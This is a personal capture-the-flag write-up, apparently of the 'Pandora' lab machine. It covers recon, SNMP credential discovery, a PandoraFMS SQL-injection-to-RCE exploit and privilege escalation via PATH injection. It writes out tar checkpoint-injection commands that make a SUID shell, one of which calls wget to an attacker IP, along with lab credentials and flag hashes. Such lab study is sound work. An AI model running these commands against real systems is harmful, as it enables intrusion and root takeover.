# Lessons learned
- if you just learn something (like tar wildcard injection) it may not be the exact same vuln. look into other vulns like PATH injection on linux. (got stuck on trying to inject tar arguments)
- study different privesc vectors, pull up a reference 

# Writeup 
## Recon

### rustscan

```
sudo rustscan -a <ip> | tee rustscan.txt
```

### nmapAutomator

```
sudo nmapAutomator.sh -H <ip> -t Recon 
```

## autorecon

```
sudo python3 autorecon.py -t targets.txt -v
```

![](Pasted%20image%2020231018134148.png)
![](Pasted%20image%2020231018134654.png)
## Initial Access
panda.htb virtual host?
![](Pasted%20image%2020231018134234.png)


from snmpwalk
![](Pasted%20image%2020231018135135.png)
![](Pasted%20image%2020231018140708.png)

user pwned! (login via ssh) `daniel:HotelBabylon23`
![](Pasted%20image%2020231018140755.png)
but no user.txt yet.
![](Pasted%20image%2020231018140833.png)
## Privesc
![](Pasted%20image%2020231018140922.png)
![](Pasted%20image%2020231018141113.png)

password in PHP files? 
![](Pasted%20image%2020231018141429.png)
![](Pasted%20image%2020231018141453.png)
pandora.panda.htb? on localhost:80
![](Pasted%20image%2020231018141656.png)

PandoraFMS 1.0.0
![](Pasted%20image%2020231018142349.png)

accessing pandoraFMS through local port forwarding ssh
![](Pasted%20image%2020231018144000.png)
![](Pasted%20image%2020231018144026.png)
![](Pasted%20image%2020231018144731.png)
RCE (authenticated)
![](Pasted%20image%2020231018144147.png)


i changed the local port forward to make it more convenient
![](Pasted%20image%2020231018150504.png)

unauthenticated sql injection exploit to RCE
https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated

![](Pasted%20image%2020231018150434.png)

python3 revshell woot! matt user pwned! user.txt got!
![](Pasted%20image%2020231018150654.png)
![](Pasted%20image%2020231018150700.png)


getting ssh access to matt
![](Pasted%20image%2020231018151046.png)
![](Pasted%20image%2020231018151053.png)
![](Pasted%20image%2020231018151203.png)
![](Pasted%20image%2020231018151237.png)

in linpeas we have an interesting SUID binary that matt can run called pandora_backup
![](Pasted%20image%2020231018151716.png)
if we run it and look at pspy64, can see what it is doing.
![](Pasted%20image%2020231018151802.png)
![](Pasted%20image%2020231018151815.png)
![](Pasted%20image%2020231018153437.png)


exploit this
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh      
echo "" > 'shell.sh --checkpoint=1'
echo "" > 'shell.sh --checkpoint-action=exec=sh shell.sh'  
```

```
touch test
echo "" > 'test --checkpoint=1 --checkpoint-action=exec=wget 10.10.16.30:443'  
```
![](Pasted%20image%2020231018152438.png)

i got stuck on this for some time. what to do?

`pandora:PandoraFMSSecurePass2021` mysql creds

UGH i used a hint. watched walkthrough for privesc. it's driving me nuts.
- turns out it's NOT tar wildcard injection, but PATH injection with tar.

in home directory now: 
![](Pasted%20image%2020231018190957.png)
![](Pasted%20image%2020231018191010.png)
```
export PATH=$(pwd):$PATH
```

![](Pasted%20image%2020231018191112.png)

root PWNED!
![](Pasted%20image%2020231018191329.png)

## Loot
user.txt
```
b6835577a9d3cc724b920ab9731c9622
```


root.txt
```
83b8704f1452d7ff4c8b270c357ac1b8
```